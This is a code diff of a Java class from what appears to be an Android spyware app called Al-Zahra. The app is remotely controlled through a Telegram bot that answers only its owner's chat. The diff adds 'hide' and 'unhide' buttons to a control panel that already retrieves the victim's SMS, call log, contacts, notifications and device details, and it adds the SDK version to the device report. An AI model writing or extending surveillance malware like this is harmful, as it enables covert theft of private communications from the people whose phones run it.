@@ -1,7 +1,6 @@
 package com.alzahra.bot;
 
 import android.content.Context;
-import android.content.SharedPreferences;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
@@ -12,7 +11,6 @@ import com.alzahra.collector.NotificationCollector;
 import com.alzahra.collector.SMSCollector;
 
 import org.json.JSONArray;
-import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
@@ -166,18 +164,12 @@ public class TelegramBot {
                         command = message.getString("text").trim();
                     }
                 }
-            } else if (update.has("callback_query")) {
-                JSONObject cb = update.getJSONObject("callback_query");
-                String chatId = String.valueOf(cb.getJSONObject("message").getJSONObject("chat").getLong("id"));
-                if (chatId.equals(OWNER_CHAT_ID)) {
-                    command = cb.getString("data").trim();
-                }
             }
             if (command != null) {
                 Log.d(TAG, "Command: " + command);
                 handleCommand(command);
             }
-        } catch (JSONException e) {
+        } catch (Exception e) {
             Log.e(TAG, "Process update error", e);
         }
     }
@@ -231,6 +223,7 @@ public class TelegramBot {
                     JSONObject info = new JSONObject();
                     info.put("model", android.os.Build.MODEL);
                     info.put("android", android.os.Build.VERSION.RELEASE);
+                    info.put("sdk", android.os.Build.VERSION.SDK_INT);
                     sendToOwner("📱 معلومات الجهاز\n```json\n" + info.toString(2) + "\n```");
                 } catch (Exception e) { sendToOwner("❌ خطأ: " + e.getMessage()); }
             });
@@ -243,7 +236,7 @@ public class TelegramBot {
 
     private void sendControlPanel() {
         String text = "🎛️ لوحة تحكم Al-Zahra\n\n📱 " + android.os.Build.MODEL + "\n🤖 Android " + android.os.Build.VERSION.RELEASE;
-        String keyboard = "{\"inline_keyboard\":[[{\"text\":\"📨 SMS\",\"callback_data\":\"/sms\"},{\"text\":\"📞 المكالمات\",\"callback_data\":\"/calls\"}],[{\"text\":\"👥 جهات الاتصال\",\"callback_data\":\"/contacts\"},{\"text\":\"🔔 الإشعارات\",\"callback_data\":\"/notifications\"}],[{\"text\":\"📱 معلومات\",\"callback_data\":\"/info\"}]]}";
+        String keyboard = "{\"inline_keyboard\":[[{\"text\":\"📨 SMS\",\"callback_data\":\"/sms\"},{\"text\":\"📞 المكالمات\",\"callback_data\":\"/calls\"}],[{\"text\":\"👥 جهات الاتصال\",\"callback_data\":\"/contacts\"},{\"text\":\"🔔 الإشعارات\",\"callback_data\":\"/notifications\"}],[{\"text\":\"📱 معلومات\",\"callback_data\":\"/info\"}],[{\"text\":\"🔒 إخفاء\",\"callback_data\":\"/hide\"},{\"text\":\"🔓 إظهار\",\"callback_data\":\"/unhide\"}]]}";
         sendRaw("sendMessage", "chat_id", OWNER_CHAT_ID, "text", text, "parse_mode", "Markdown", "reply_markup", keyboard);
     }
 
